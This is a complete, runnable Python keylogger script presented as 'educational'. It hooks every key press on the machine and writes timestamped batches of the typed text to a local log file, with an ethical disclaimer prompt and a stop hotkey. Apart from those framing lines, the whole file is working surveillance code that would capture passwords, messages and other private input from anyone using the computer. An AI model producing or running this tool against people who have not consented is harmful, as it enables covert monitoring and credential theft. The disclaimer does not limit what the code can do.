#!/usr/bin/env python3
"""
Simple Keylogger - Educational Purposes Only

This is a simple keylogger created for educational purposes.
IMPORTANT: Only use this program on systems you own or have permission to monitor.
Unauthorized use of keyloggers may violate privacy laws and regulations.
"""

import keyboard
import time
import os
from datetime import datetime

class SimpleKeylogger:
    def __init__(self, log_file="keylog.txt"):
        """Initialize the keylogger with the log file."""
        self.log_file = log_file
        self.running = False
        self.keys = []
        self.start_time = None
        
        # Create a header for the log file
        if not os.path.exists(self.log_file):
            with open(self.log_file, "w") as f:
                f.write(f"=== Simple Keylogger Started: {datetime.now()} ===\n\n")
    
    def callback(self, event):
        """Callback function that is called on every key press."""
        if event.event_type == keyboard.KEY_DOWN:
            # Only log on key down (not on key up) to avoid duplicates
            key = event.name
            
            # Handle special keys
            if len(key) > 1:
                # Format special keys with brackets
                if key == "space":
                    key = " "
                elif key == "enter":
                    key = "[ENTER]\n"
                elif key == "tab":
                    key = "[TAB]"
                elif key == "backspace":
                    key = "[BACKSPACE]"
                else:
                    key = f"[{key.upper()}]"
            
            # Add the key to our list of keys
            self.keys.append(key)
            
            # Write to the log file periodically, every 10 keys
            if len(self.keys) >= 10:
                self.write_to_log()
    
    def write_to_log(self):
        """Write the collected keys to the log file."""
        if self.keys:
            # Get the current timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Create a string of all the keys
            text = "".join(self.keys)
            
            # Write to the log file
            with open(self.log_file, "a") as f:
                f.write(f"{timestamp}: {text}\n")
            
            # Clear the keys list
            self.keys = []
            
            # Print status (remove in production)
            elapsed = time.time() - self.start_time
            print(f"Running for {elapsed:.1f} seconds... Keys logged to {self.log_file}")
    
    def start(self):
        """Start the keylogger."""
        self.running = True
        self.start_time = time.time()
        
        print(f"Keylogger started. Logging keys to {self.log_file}")
        print("Press Ctrl+Shift+K to stop the keylogger")
        
        # Register the callback for all keys
        keyboard.hook(self.callback)
        
        # Register a hotkey to stop the keylogger (Ctrl+Shift+K)
        keyboard.add_hotkey("ctrl+shift+k", self.stop)
        
        # Keep the program running
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop the keylogger."""
        # Unhook the keyboard
        keyboard.unhook_all()
        
        # Write any remaining keys
        self.write_to_log()
        
        # Write footer to log file
        with open(self.log_file, "a") as f:
            f.write(f"\n=== Simple Keylogger Stopped: {datetime.now()} ===\n")
        
        self.running = False
        elapsed = time.time() - self.start_time
        print(f"\nKeylogger stopped after {elapsed:.1f} seconds")
        print(f"Keys were logged to {self.log_file}")

def print_disclaimer():
    """Print an ethical disclaimer."""
    print("=" * 70)
    print("                      ETHICAL DISCLAIMER")
    print("=" * 70)
    print("This keylogger is created for EDUCATIONAL PURPOSES ONLY.")
    print("Using a keylogger to collect data without consent may be illegal.")
    print("Only use this software on systems you own or have permission to monitor.")
    print("The author takes NO responsibility for misuse of this software.")
    print("=" * 70)
    print("Press Enter to continue (confirming you understand the disclaimer)")
    print("or Ctrl+C to exit.")
    try:
        input()
    except KeyboardInterrupt:
        print("\nKeylogger not started. Exiting...")
        exit()

if __name__ == "__main__":
    print_disclaimer()
    
    # Create and start the keylogger
    keylogger = SimpleKeylogger()
    keylogger.start()